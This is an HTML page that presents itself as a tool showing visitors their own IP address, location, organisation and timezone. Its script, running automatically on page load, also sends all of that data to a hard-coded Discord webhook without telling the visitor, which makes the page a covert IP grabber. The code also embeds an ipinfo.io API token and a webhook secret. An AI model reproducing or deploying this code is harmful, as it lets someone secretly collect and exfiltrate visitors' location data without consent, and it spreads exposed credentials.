<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User IP Info</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        #ip-info {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            font-size: 24px;
        }
        p {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="ip-info">
        <h1>Your IP Information</h1>
        <p id="ip">Loading...</p>
        <p id="location"></p>
        <p id="org"></p>
        <p id="timezone"></p>
    </div>

    <script>
        async function fetchIPInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=1710c7628a0e83');
                const data = await response.json();
                
                // Display IP info on the page
                document.getElementById('ip').textContent = `IP: ${data.ip}`;
                document.getElementById('location').textContent = `Location: ${data.city}, ${data.region}, ${data.country}`;
                document.getElementById('org').textContent = `Organization: ${data.org}`;
                document.getElementById('timezone').textContent = `Timezone: ${data.timezone}`;

                // Send IP info to Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1248388329033175151/46egZimtPEcNCFuCnTuVuHQtINNBPeIfh6Ii40RRsqfvv_XsBx-reszhdcj4MzFa_K_x';
                const message = {
                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nTimezone: ${data.timezone}`
                };

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
                
            } catch (error) {
                document.getElementById('ip-info').textContent = 'Failed to load IP information.';
            }
        }

        fetchIPInfo();
    </script>
</body>
</html>
